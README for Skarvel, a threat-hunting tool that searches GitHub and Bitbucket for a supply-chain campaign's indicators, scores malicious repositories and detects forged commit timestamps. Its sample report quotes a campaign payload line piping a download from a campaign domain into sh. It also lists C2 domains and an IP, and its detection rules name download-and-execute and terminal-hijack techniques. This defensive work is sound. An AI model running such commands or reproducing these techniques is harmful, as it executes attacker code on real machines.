# Skarvel

Skarvel hunts public **GitHub** and **Bitbucket** repositories for a campaign
indicator of compromise (IOC) and for everything that indicator leads to. Give
it one IOC; it finds the repositories carrying it, examines every branch and
pull request of each, follows the authors of the malicious commits to their
other repositories, mines new C2 indicators from confirmed payloads, scores
each repository's maliciousness and checks every commit history for forged
timestamps — all automatically.

It was built during the investigation presented at Virus Bulletin 2026,
*Manufactured Credibility: detecting fabricated Git history in an active
software supply chain campaign*: fake recruiting/collaboration repositories
whose `.vscode/settings.json` hijacks the editor terminal
(`codeprettier.pro` → `ipregionchecker.org` → C2 `172.86.126.227`), with a
second trigger in a trojanised backend module, and a commit history generated
in one batch with every commit stamped `12:00:00` under impersonated
developers' names.

## Quick start

```bash
export GITHUB_TOKEN=ghp_...        # a token with NO scopes is enough
./skarvel --ioc 'aHR0cHM6Ly93d3cuaXByZWdpb25jaGVja2VyLm9yZy9hcGkvaXAtY2hlY2stZW5jcnlwdGVkLzNhZWIzNGEzMg=='
```

That is the whole interface. Hunting depth, correlation, timestamp analysis,
scoring and traversal are not options; they always run.

## Usage

```text
skarvel --ioc <IOC> [--platform github|bitbucket] [-a] [--plain]
```

| Flag | Meaning |
|---|---|
| `-r`, `--repo <repo>` | Scan one repository (`owner/name` or its URL) instead of hunting; then `--ioc` is optional. |
| `--ioc <IOC>` | **Required** unless `--repo` is given. Domain, IP, URL, secret, path or any string — raw or encoded. |
| `--platform` | `github` (default) or `bitbucket`. |
| `--workspace <slug>` | Bitbucket only, optional, repeatable. Extra workspaces to search (see below). |
| `-a`, `--activity` | Also show the live activity feed in the dashboard (hidden by default). |
| `--plain` | No dashboard and no colours: a one-line progress indicator and the plain-text report (v0.10 behaviour). |
| `--version` | Print the version. |
| `-h`, `--help` | Usage. |

`--ioc` may be repeated to hunt several indicators in one run.

### Examples to test with

```bash
# GitHub (default platform): the campaign's base64-encoded C2 endpoint.
# It is hunted as given AND decoded
# (https://www.ipregionchecker.org/api/ip-check-encrypted/3aeb34a32).
./skarvel --ioc 'aHR0cHM6Ly93d3cuaXByZWdpb25jaGVja2VyLm9yZy9hcGkvaXAtY2hlY2stZW5jcnlwdGVkLzNhZWIzNGEzMg=='

# GitHub: the lure domain served to the hijacked VS Code terminal
./skarvel --ioc codeprettier.pro

# Bitbucket: no credentials needed for public workspaces
./skarvel --ioc 'aHR0cHM6Ly93d3cuaXByZWdpb25jaGVja2VyLm9yZy9hcGkvaXAtY2hlY2stZW5jcnlwdGVkLzNhZWIzNGEzMg==' --platform bitbucket

# Bitbucket, also searching an extra workspace
./skarvel --ioc codeprettier.pro --platform bitbucket --workspace some-workspace
```

A report looks like this (illustrative values, not the output of a real run):

```text
  SKARVEL · hunt report                                 2026-10-07 16:40
  ──────────────────────────────────────────────────────────────────────
  IOC        codeprettier.pro
  platform   github                                     duration 0:01:33
  scope      7 repos examined · 41 discovered · 12 hits · 2 new IOCs
  ──────────────────────────────────────────────────────────────────────

  ═══ 1 MALICIOUS · repository confirmed

  ● https://github.com/example/lure  [forged commit timestamps]
      why   MALICIOUS · 2 definitive signal(s)
      via   indicator codeprettier.pro ─[indicator-match]→ this repository
      clock 148 of 190 commits on the hour (p=3.2e-401, 2 bot commits excluded)
      └─ /.vscode/settings.json
            A indicator-code-search · A indicator-domain · B vscode-terminal-hijack
            match "command": "curl https://codeprettier.pro/settings/linux?flag=3 | sh"
            ↳ https://github.com/example/lure/blob/9f2c1ab7e0d4/.vscode/settings.json#L4

  ═══ 0 TO VERIFY · nothing needs manual verification

  ═══ 2 NEW IOCs · mined from confirmed payloads and searched (URLs defanged, secrets masked)

    url     hxxps://c2.lure-host.io/api/ip-check  from example/lure:.vscode/settings.json
    ip      172.86.126.227:8087                   from example/lure:.vscode/settings.json

  ──────────────────────────────────────────────────────────────────────
  [i] All results are automated leads. Verify every repository
      manually before acting on or attributing it.
```

Each repository says **why** it is listed (the verdict and its reason), **via**
which path the crawl reached it, and, per flagged file, which signals fired
(`A` definitive, `B` strong, `C` supporting), the text that matched, and a
permalink pinned to the commit the file was read at. A `clock` line gives the
statistics behind a forged-timestamps flag. A repository found only through the
search index (never cloned) is listed under *to verify* and says so.

The **NEW IOCs** section lists the indicators mined from confirmed payloads and
added to the search; **IOC CANDIDATES** lists those held back for an analyst's
decision (most specific first, capped at 20). In both, URLs are defanged
(`hxxps://`) so no terminal or viewer turns a command-and-control address into
a link, and secrets are masked because they may be real credentials. Anything an
indicator was already being hunted for (your `--ioc`, the built-in set) is not
listed as new.

The terminal report (printed to stdout in colour) is drawn by the same code as
the file, so the two always agree; only the colour differs.

## Installation

`final/` is self-contained: no files from outside it are needed, and the
program has **no third-party Go dependencies** (standard library only).

Runtime requirements:

- `git` on `PATH` (any reasonably recent version).
- Network access to `api.github.com` / `github.com`, or `api.bitbucket.org` /
  `bitbucket.org`.

Prebuilt static binaries are in `bin/`:

| File | Platform |
|---|---|
| `bin/skarvel-linux-amd64`, `bin/skarvel-linux-arm64` | Linux |
| `bin/skarvel-darwin-amd64`, `bin/skarvel-darwin-arm64` | macOS |
| `bin/skarvel-windows-amd64.exe`, `bin/skarvel-windows-arm64.exe` | Windows |

`./skarvel` is a small launcher script that picks the right binary for the
current Linux/macOS machine (and builds it if it is missing and Go is
installed). On Windows run the `.exe` directly. Copy the whole `final/`
directory to another machine and it runs as is.

To rebuild (Go 1.26 or newer):

```bash
scripts/build.sh          # this machine's OS/architecture → bin/
scripts/build.sh all      # all six binaries
go test ./...             # offline test suite (needs git for fixture repos)
```

## Credentials and environment

| Variable | Platform | Required | Notes |
|---|---|---|---|
| `GITHUB_TOKEN` (or `GH_TOKEN`) | GitHub | **yes** | GitHub code search requires authentication. Create a token at <https://github.com/settings/tokens> with **no scopes selected**: reading public data needs none, and a leaked empty-scope token grants nothing. |
| `BITBUCKET_TOKEN` | Bitbucket | no | Workspace or repository access token, sent as Bearer; raises the rate limit and unlocks private workspaces. An Atlassian account API token (`ATATT…`) here needs `BITBUCKET_USER` set to the account email (it is then sent as Basic auth). |
| `BITBUCKET_USER` + `BITBUCKET_APP_PASSWORD` | Bitbucket | no | Alternative to `BITBUCKET_TOKEN`: Atlassian account email + an API token **with scopes** (Bitbucket app, read scopes for repositories and workspaces). Your bitbucket.org sign-in password does not work for the API. |
| `NO_COLOR` | both | no | If set (any value), disables colours; the dashboard layout stays. |

The GitHub token is checked before the hunt starts; a rejected (expired,
revoked or truncated) token stops the run with an error instead of producing an
empty report. Bitbucket credentials, when set, are checked the same way: a
401 stops the run before the hunt and explains how to fix or unset them
(public workspaces need no credentials at all). Tokens are used only for API calls. Clones are anonymous HTTPS and never carry
credentials.

## Output

Results are printed to **stdout** and written to **one file** in the
**current working directory**:

```text
skarvel_output_YYYYMMDD_HHMMSS.txt      e.g. skarvel_output_20261006_171500.txt
```

The timestamp is the local start time of the run. An existing file is never
overwritten; a second run in the same second gets a `_1` suffix. No other
files are produced: clones go to a private temporary directory that is
deleted when the run ends (including on Ctrl-C).

### Terminal UI (new in v0.11)

When stderr is an interactive terminal, the hunt runs behind a full-screen
live dashboard (alternate screen, so your scrollback is left untouched):

- a header with platform, status and elapsed time, and the IOC(s) being hunted;
- what is being visited right now;
- counters: repositories examined, malicious, review, hits, discovered,
  newly promoted IOCs, crawl round;
- a **Detections** panel listing every MALICIOUS / REVIEW verdict with its
  tier counts and score, marked `lead` when reached through an identity lead;
- with `-a` / `--activity`, an **Activity** feed of discoveries, visits, hits
  (coloured by tier), verdicts, promoted indicators and engine messages.

It adapts to the window size and redraws on resize. Without `-a` the
Detections panel fills the screen; with `-a`, activity sits on the left and
detections on the right from 100 columns wide, stacked below that (a compact
view on small windows). Ctrl-C
shows *interrupted* in the header and then writes the results so far; a second
Ctrl-C restores the terminal and aborts. When the run ends the dashboard
closes and the report is printed on stdout in colour, with a header card,
`═══` section banners, tree-style file lists and an inline tag for forged
timestamps.

### Fewer false positives (new in v0.15)

- **Date-sharded data dumps are feeds.** Repositories such as
  `cirosantilli/expired-domain-names-by-day-2021` store data as extensionless
  digit paths (`01/01/05`). That layout, and names such as `expired-domain`,
  `domain-list` or `newly-registered`, now identify a catalogue, so the repository
  is treated as documenting the campaign rather than carrying it.
- **Mined IOCs are filtered before they are listed.** The NEW IOCs and CANDIDATES
  lists no longer fill with: file names that end in a country code (`install.sh`,
  `this.is`), subdomains of large services (google, amazonaws, ...), placeholder
  hosts (`example.com`), localhost and intranet URLs, template URLs (`${HOST}`),
  image/font/CSS URLs, documentation/CGNAT/resolver addresses and version numbers
  read as IPs, and "secrets" that are really hashes, UUIDs, alphabet tables or
  identifiers (a secret must now mix upper, lower and several digits).

### Self-declared repositories (new in v0.14)

Researchers and victims publish copies of a lure so others can study it, and say
so in the README ("THIS REPO CONTAINS MALICIOUS CODE ... DO NOT DOWNLOAD OR
RUN"). Those repositories match every signature, so they used to be reported as
`MALICIOUS`. Skarvel now reads the description and the top of the README and, if
the owner states that the repository holds malicious code *and* warns against
running it (or says it exists for investigation only), reports it in its own
`SELF-DECLARED` section with the owner's words and the files that matched. It is
still cloned and analysed, but it is not counted as malicious and nothing is
expanded or mined from it. The notice is the owner's unverified claim -- an
operator could write the same sentence -- which is why the repository stays in
the report instead of being dropped.

### Single-repository scan (new in v0.13)

`--repo` / `-r <owner/name | URL>` scans one repository and nothing else: all
branches and pull requests are cloned and examined, with the same scoring and
report. No code search, no canary, no expansion to authors or mined indicators,
and the "documents the campaign" skip is not applied to a repository you named.
`--ioc` is optional and adds indicators to match inside it; `GITHUB_TOKEN` is
optional. If the repository cannot be fetched or cloned the run fails with an
error rather than printing an empty report.

### Report redesign (new in v0.12)

The end-of-run report was reworked so the terminal view and the output file
share one layout: a header card (IOCs, platform, duration, scope counts),
`═══ N LABEL · caption` section banners, `├─/└─` file trees per repository,
and an inline `[forged commit timestamps]` tag. The terminal adds colour; the
file stays ANSI-free, so it still diffs and greps cleanly.

### Hardening against hostile repositories (v0.12)

Skarvel reads repositories chosen by an adversary, so v0.12 tightens the places
where that input could hurt the analyst or the run:

- **Report text is sanitised once, at the source.** Repository names, file
  paths and warnings have control characters (including ESC) removed before any
  renderer sees them, so `cat skarvel_output_*.txt`, `--plain` and piped output
  are as safe as the colour view, and a file name cannot forge a report line.
- **Files are read by object ID, not by path.** git allows a newline in a file
  name, which used to shift every later response onto the wrong file. Content is
  now requested by blob ID and the path is kept alongside.
- **Memory is bounded.** Blobs are streamed one at a time, and any blob over the
  size limit is skipped without being allocated.
- **String-concatenation joining is bounded.** Lines ending or starting with `+`
  are joined to catch a split indicator, but only up to 64 KB / 256 lines, so a
  crafted file cannot stall the run.
- **A match in a config file keeps its tier.** Only files that *record*
  indicators (prose, CSV, feed layouts, files named like `iocs.json`) have a
  finding's tier capped. A campaign address in `config.json` or `settings.yaml`
  is a configured C2 and is no longer treated as a list entry.

The dashboard is a pure subscriber of the engine's event bus and only ever
writes to stderr: **the output file is always the plain-text format shown
above**, and so is stdout whenever it is not a terminal
(piped or redirected). `--plain` brings back the v0.10 single status line
and plain report on a terminal too. The UI uses only ANSI escape sequences —
still no third-party dependencies — and strips control characters from every
repository name, path and message before display, so hostile repository
content cannot inject escape sequences into the analyst's terminal. On Windows
it enables VT processing (Windows 10+) and falls back to plain output if that
is unavailable.

Format:

```text
[+] 2 malicious repos found.
[.] https://github.com/example/lure-repo
    /.vscode/settings.json
    /backend/src/compliance/complianceService.js
    (forged commit timestamps)
[.] https://github.com/example/second-lure
    /.vscode/tasks.json

[!] MANUAL VERIFICATION REQUIRED: 2 repos with weaker or unconfirmed signals.
[.] https://github.com/example/maybe
    /scripts/setup.sh
[.] https://github.com/example/generated-history
    (forged commit timestamps)

[!] All results are automated leads. Verify every repository manually before acting on or attributing it.
```

| Marker | Meaning |
|---|---|
| `[+]` | Repositories that were cloned, analysed and rated **MALICIOUS** by the scoring rules, reached through evidence. |
| `[!]` | Repositories that **must be verified by hand**: a REVIEW verdict; a MALICIOUS verdict reached only through an identity lead; a search-index hit that was never cloned (for example, because a budget ran out); or a repository whose only signal is forged commit history. |
| `[.]` | A repository (base URL), followed by the files carrying its findings — strongest first, executable files before documentation, at most 10 per repository. |
| `(forged commit timestamps)` | The repository's commit history failed the timestamp test (see below). |
| `[-]` | The hunt is **incomplete**: it stopped early (budget, interrupt, failed search canary) or some searches failed. When this line is present, an empty result proves nothing. |

Exit status: `0` on completion (including a budget stop), `1` if the hunt
failed, `2` for invalid arguments or missing credentials, `130` on a second
Ctrl-C.

## What runs automatically

```text
IOC (as given + every encoding + decoded form)
 ↓  code search (GitHub global index / Bitbucket workspaces)
Repository  ── clone every branch and pull request → signatures, IOC match,
 ↓              timestamp test, maliciousness score
Author identities of the flagged files
 ↓  commit search
Their other repositories  ── examined the same way
 ↓
New C2 domains / IPs / URLs / secrets mined from confirmed-malicious files
 ↓  searched as new IOCs  … until two rounds add nothing new or a budget ends
```

- **IOC matching in every form** the campaign uses: raw, standard base64, the
  family's lowercase-first base64 alphabet, hex, `\xNN` escapes,
  `String.fromCharCode` arrays, and strings split across `"a" + "b"`
  concatenation (including across lines). An IOC that is itself base64 or hex
  is also decoded and hunted in plain form.
- **Built-in campaign indicators** (`codeprettier.pro`, `code-beautify.com`,
  `ipregionchecker.org`, `isillegalregion.com`, `172.86.126.227`,
  `/api/ip-check-encrypted/`, the shared HMAC secret) are hunted on every run
  alongside your IOC, because the operator reuses infrastructure across lures.
- **Every branch and every pull request** (GitHub keeps the head of closed and
  rejected PRs) is scanned, not just the default branch; each distinct version
  of a file is read, so a side branch that rewrites an existing file is caught.
- **Correlation follows authorship, not ownership.** A malicious file
  implicates whoever committed it, not the owner of the repository it sits in
  — in this campaign the owners were victims. So expansion goes from a flagged
  file to its commit authors to their other repositories. Where the history is
  proven forged, its author names are exactly what was forged, so they are not
  followed as evidence; names reused across two or more forged histories are
  held back as *leads* and explored only once the evidential search is
  exhausted. Anything found that way is reported under `[!]`, never `[+]`.
- **Indicator mining:** domains, IPs, URLs and high-entropy secrets extracted
  from a repository already rated MALICIOUS become new search seeds. Generic
  strings and well-known hosts (github.com, npmjs.org, …) never do.

### Maliciousness scoring (high level)

Every finding has a tier:

| Tier | Score | Examples |
|---|---|---|
| **A** definitive | 100 | A confirmed campaign indicator in any encoding. |
| **B** strong | 60 | Network response evaluated as code (`eval(res.data)`, `new Function.constructor('require', …)`); VS Code terminal-profile hijack; task auto-run on folder open; Defender exclusion; PowerShell download-and-execute; strongly forged history. |
| **C** supporting | 15 | `curl … \| sh`; base64 `https://`; `x-secret-header`; `DEV_API_KEY`-style config keys; `files.exclude` hiding `.vscode`; whitespace padding pushing code off-screen; hidden windows; weakly forged history; a forged persona. |
| **D** lead | 0 | Identity-name matches. Never scores. |

A repository is **MALICIOUS** with any Tier A finding, two or more Tier B, or
one Tier B plus three distinct Tier C in the same file. It is **REVIEW** with
one Tier B, or two distinct Tier C signals in the **same file** (supporting
signals scattered across a repository are normal developer tooling; the same
signals concentrated in one file look like a payload).

Guards keep this honest:

- Matches in prose/data files (README, CSV, IOC lists) are capped at Tier C
  and never pair up into a stronger signal.
- Vendored and minified code is excluded from the signatures (but still
  searched for indicators, since that is where supply-chain payloads land).
- Repositories that **document** the campaign — threat-intel feeds, advisory
  databases, malware sample collections — are recognised and left out of the
  output instead of being reported as compromised.
- One payload copied into fifty forks is one finding for the crawl budget,
  but each repository still gets its own verdict.
- Known toolchain installers (`sh.rustup.rs`, `get.docker.com`, …) are
  downgraded, never hidden.

### Forged-timestamp detection (high level)

Organic commits scatter across the minute; a generator stamps a fixed time.
For every examined repository, on every ref:

1. Bot identities (dependabot, renovate, GitHub Actions, …) are removed first:
   they commit on the hour legitimately.
2. Each commit is read on the author's **local** clock, including their own UTC
   offset. Generators stamp a fixed local hour, so with several personas in
   different timezones the pattern is invisible in UTC.
3. **Repository test:** with *k* of *n* commits exactly on `hh:00:00`, the
   probability of that happening by chance (binomial, p = 1/3600) is computed.
   `k ≥ 10`, `n ≥ 20` and probability below 10⁻⁹ is a strong (Tier B) signal;
   `k ≥ 3` and below 10⁻⁶ is supporting (Tier C).
4. **Persona test:** any single author with 3 or more commits, **all** on the
   hour, is a forged persona (Tier C), which catches a fabricated identity
   inside an otherwise organic history.

A repository whose only signal is forged history is still reported, under
`[!]`. The personas' names are not printed: in this campaign they belonged to
real developers who were impersonated.

## Built-in limits

These used to be flags and are now fixed defaults: 300 repositories, 500 code
searches, 20,000 API calls, 4 hours wall-clock, 20 GiB of clones on disk at
once, a 2 GiB maximum repository size, 6 hops as a runaway ceiling, and 20
minutes per repository. When a limit stops the hunt, the output says so with
a `[-]` line, and repositories found but not yet examined are listed under
`[!]`.

## Limitations and operational notes

- **Every result needs manual verification.** The tool produces leads for an
  analyst, not verdicts for publication. Never attribute a repository to a
  person from this output: author names in git are unauthenticated and, in
  this campaign, deliberately forged.
- **GitHub code search indexes default branches only** and returns at most
  200 hits per indicator. An IOC that exists only on a side branch is reached
  through correlation, not through search.
- **Bitbucket has no global code search.** Each IOC is searched inside the
  built-in campaign workspace (`bloxbits`) plus any `--workspace` you name;
  nothing outside them is reachable by search. Bitbucket also has no
  cross-repository commit search (so no author → other repositories step) and
  does not publish pull-request heads over git.
- **Anonymous Bitbucket** allows about 60 search requests per hour; when that
  quota is exhausted the run stops with a message naming the reset time. Set
  `BITBUCKET_TOKEN` for long hunts.
- **Search canary (GitHub):** every run first checks that a query known to
  return results still does. If it returns zero, GitHub's search has changed
  and the run stops rather than reporting false negatives.
- **Force-pushed and deleted commits** are unreachable to any clone.
- **Domain-registered-after-commit** checks are specified but not implemented
  (they need registry lookups).
- **Safety:** nothing from a target repository ever runs. Clones are bare (no
  working tree, no checkout filters, no submodules, no hooks); `ext::` and
  `file::` transports are refused, credential prompts are disabled, and every
  clone is deleted as soon as it has been analysed.
- A long hunt can take hours and several GB of temporary disk; Ctrl-C at any
  time writes the results so far.

## Layout

```text
final/
├── skarvel                 launcher (Linux/macOS)
├── bin/                    prebuilt static binaries
├── cmd/skarvel/            CLI, report rendering, live dashboard, ANSI
│                           terminal layer (+ tests)
├── internal/
│   ├── crawl/              expansion engine, analyser, budgets, frontier
│   ├── criteria/           tiers, scoring, timestamp + persona tests
│   ├── indicator/          IOC encodings, decoding, mining, promotion gate
│   ├── scan/               content signatures
│   ├── guard/              corpus / documentary / vendored / canary guards
│   ├── graph/              discovered nodes, findings, provenance
│   ├── ghapi/, bbapi/      GitHub and Bitbucket clients (rate-limit aware)
│   ├── gitx/               hardened git operations
│   ├── event/, model/      internal event bus and shared types
├── scripts/build.sh
└── go.mod
```
